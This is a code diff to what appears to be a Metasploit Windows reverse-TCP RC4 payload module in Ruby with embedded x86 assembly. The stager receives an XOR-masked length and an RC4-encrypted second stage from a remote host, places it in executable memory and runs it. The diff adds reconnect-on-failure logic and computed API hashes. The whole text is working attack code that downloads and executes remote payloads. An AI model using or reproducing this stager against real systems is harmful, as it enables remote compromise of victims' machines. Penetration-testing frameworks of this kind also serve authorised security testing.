@@ -75,21 +75,28 @@ module Payload::Windows::ReverseTcpRc4
   #
   def asm_block_recv_rc4(opts={})
     xorkey = Rex::Text.to_dword(opts[:xorkey]).chomp
+    reliable     = opts[:reliable]
     asm = %Q^
-      ; Same as block_recv, only that the length will be XORed and the stage will be RC4 decoded.
-      ; Differences to block_recv are indented two more spaces.
-      ; Compatible: block_bind_tcp, block_reverse_tcp
-      ; Input: EBP must be the address of 'api_call'. EDI must be the socket. ESI is a pointer on stack.
-      ; Output: None.
-      ; Clobbers: EAX, EBX, ECX, EDX, ESI, (ESP will also be modified)
       recv:
-      ; Receive the size of the incoming second stage...
-        push  0x00             ; flags
-        push  0x04             ; length = sizeof( DWORD );
-        push esi               ; the 4 byte buffer on the stack to hold the second stage length
-        push edi               ; the saved socket
-        push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
-        call ebp               ; recv( s, &dwLength, 4, 0 );
+        ; Receive the size of the incoming second stage...
+        push 0                  ; flags
+        push 4                  ; length = sizeof( DWORD );
+        push esi                ; the 4 byte buffer on the stack to hold the second stage length
+        push edi                ; the saved socket
+        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        call ebp                ; recv( s, &dwLength, 4, 0 );
+    ^
+
+    if reliable
+      asm << %Q^
+        ; reliability: check to see if the recv worked, and reconnect
+        ; if it fails
+        cmp eax, 0
+        jle cleanup_socket
+      ^
+    end
+
+    asm << %Q^
       ; Alloc a RWX buffer for the second stage
         mov esi, [esi]         ; dereference the pointer to the second stage length
           xor esi, #{xorkey}   ; XOR the stage length
@@ -98,11 +105,11 @@ module Payload::Windows::ReverseTcpRc4
         push 0x1000            ; MEM_COMMIT
       ; push esi               ; push the newly recieved second stage length.
           push ecx             ; push the alloc length
-        push  0x00             ; NULL as we dont care where the allocation is.
-        push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+        push 0                 ; NULL as we dont care where the allocation is.
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
       ; Receive the second stage and execute it...
-      ;   xchg ebx, eax          ; ebx = our new memory address for the new stage + S-box
+      ; xchg ebx, eax          ; ebx = our new memory address for the new stage + S-box
           lea ebx, [eax+0x100] ; EBX = new stage address
         push ebx               ; push the address of the new stage so we can return into it
           push esi             ; push stage length
@@ -112,8 +119,43 @@ module Payload::Windows::ReverseTcpRc4
         push esi               ; length
         push ebx               ; the current address into our second stage's RWX buffer
         push edi               ; the saved socket
-        push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
+        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
         call ebp               ; recv( s, buffer, length, 0 );
+    ^
+
+    if reliable
+      asm << %Q^
+        ; reliability: check to see if the recv worked, and reconnect
+        ; if it fails
+        cmp eax, 0
+        jge read_successful
+
+        ; something failed, free up memory
+        pop eax                 ; get the address of the payload
+        push 0x4000             ; dwFreeType (MEM_DECOMMIT)
+        push 0                  ; dwSize
+        push eax                ; lpAddress
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
+        call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
+
+      cleanup_socket:
+        ; clear up the socket
+        push edi                ; socket handle
+        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
+        call ebp                ; closesocket(socket)
+
+        ; restore the stack back to the connection retry count
+        pop esi
+        pop esi
+        dec [esp]               ; decrement the counter
+
+        ; try again
+        jmp create_socket
+      ^
+    end
+
+    asm << %Q^
+      read_successful:
         add ebx, eax           ; buffer += bytes_received
         sub esi, eax           ; length -= bytes_received
       ; test esi, esi          ; test length
@@ -131,7 +173,13 @@ module Payload::Windows::ReverseTcpRc4
       #{asm_decrypt_rc4}
         pop edi              ; restore socket
       ret                    ; return into the second stage
-      ^
+    ^
+
+    if opts[:exitfunk]
+      asm << asm_exitfunk(opts)
+    end
+
+    asm
   end
 
 private
